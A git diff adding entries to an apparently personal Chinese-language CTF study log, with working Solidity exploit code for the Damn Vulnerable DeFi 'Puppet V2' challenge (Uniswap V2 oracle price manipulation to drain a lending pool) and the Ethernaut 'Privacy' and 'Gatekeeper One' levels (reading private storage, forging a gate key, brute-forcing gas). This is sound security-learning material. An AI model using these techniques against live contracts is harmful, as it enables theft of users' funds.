@@ -712,8 +712,158 @@ contract CallPuppet{
 
 ### 2024.09.06
 
+#### puppet v2
+
+一样的，使用了v2的reserve计算价格，可以向池内注入大量token拉低其价格。
+
+poc：
+
+```
+    function test_puppetV2() public checkSolvedByPlayer {
+        console.logAddress(address(weth));
+        CallPuppet cp=new CallPuppet(address(token),address(lendingPool),address(uniswapV2Router),address(weth));
+        token.transfer(address(cp), token.balanceOf(player));
+        cp.start{value:20 ether}(recovery, address(uniswapV2Exchange));
+    }
+    
+contract CallPuppet{
+    DamnValuableToken token;
+    PuppetV2Pool lendingPool;
+    IUniswapV2Router02 router;
+    WETH weth;
+    constructor(address dvt,address pp,address r,address _weth){
+        token=DamnValuableToken(dvt);
+        lendingPool=PuppetV2Pool(pp);
+        router=IUniswapV2Router02(r);
+        weth=WETH(payable(_weth));
+    }
+
+    function start(address recovery,address unipool)public payable{
+
+        token.approve(address(router),type(uint256).max);
+        console.log(token.balanceOf(address(this)));
+        address[] memory path=new address[](2);
+        path[0]=address(token);
+        path[1]=address(weth);
+       
+        router.swapExactTokensForETH(1e4*1e18, 0, path,address(this),block.timestamp+1 days);
+        uint amount = lendingPool.calculateDepositOfWETHRequired(1e6*1e18);
+        console.logUint(amount);
+        uint256 depositValue = amount - weth.balanceOf(address(this));//差的weth去兑换补足
+        weth.deposit{value:depositValue}();
+        weth.approve(address(lendingPool), amount);
+        lendingPool.borrow(1e6*1e18);
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+    receive()payable external{
+
+    }
+}
+```
 
 ### 2024.09.07
+#### privacy
 
-### 2024.09.08
+题目
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+    bool public locked = true; //0
+    uint256 public ID = block.timestamp;//1
+    uint8 private flattening = 10;
+    uint8 private denomination = 255;
+    uint16 private awkwardness = uint16(block.timestamp);//2
+    bytes32[3] private data;//3,4,5,data[2]在slot 5
+
+    constructor(bytes32[3] memory _data) {
+        data = _data;
+    }
+
+    function unlock(bytes16 _key) public {
+        require(_key == bytes16(data[2]));
+        locked = false;
+    }
+}
+```
+
+其中，下面的三个变量会存在同一个slot内，所以按顺序，data[2]是在slot 5。
+
+    uint8 private flattening = 10;
+    uint8 private denomination = 255;
+    uint16 private awkwardness = uint16(block.timestamp);//2
+
+所以：
+```
+await web3.eth.getStorageAt("0xd0173f719C91d8B53cb4e45758A18C0Bc007214a",5)
+'0x8051fab8ce920ecc5ba128fd3edc66f02209821198cefc62f0c776dc3ff679f0'
+```
+
+知道key为0x8051fab8ce920ecc5ba128fd3edc66f0。
+
+
+### 2024.09.09
+#### Gatekeeper One
+
+题目要求通过modifier中的判断条件，分析如下：
+
+```
+contract GatekeeperOne {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);//使用合约
+        _;
+    }
+
+    modifier gateTwo() {
+        require(gasleft() % 8191 == 0);//此处剩余gas是8191整数倍
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {//XX1 XX2 XX3 XX4 XX5 XX6 XX7 XX8
+        //xx5 xx6 xx7 xx8 = 00 00 xx7 xx8  =>  xx5 xx6 = 00 00 
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        //00 00 00 00 00 00 xx7 xx8 !=  xx1 xx2 xx3 xx4 00 00 xx7 xx8 =>  xx1 xx2 xx3 xx4 != 0
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        //00 00 xx7 xx8 == 00 00 3b 91  =>  xx7 xx8 == 3b 91
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        //=> xx xx xx xx 00 00 3b 91
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+
+因此key为：xx xx xx xx 00 00 3b 91
+
+POC：
+
+```
+contract CallGateKeeper{
+    uint256 public gas;
+    function start(address keeper,bytes8 key)public{//0x1122334400003b91   0x112233440000ddC4
+        bytes memory callData=abi.encodeCall(GatekeeperOne.enter,key);
+         uint s=8191*3;
+        while(true){
+            (bool success,)=keeper.call{gas:s}(callData);
+            if (success==true){
+                gas=s;
+                break;
+            }
+            s++;
+        }
+       
+    }
+
+}
+```
+### 2024.09.10
+
 <!-- Content_END -->
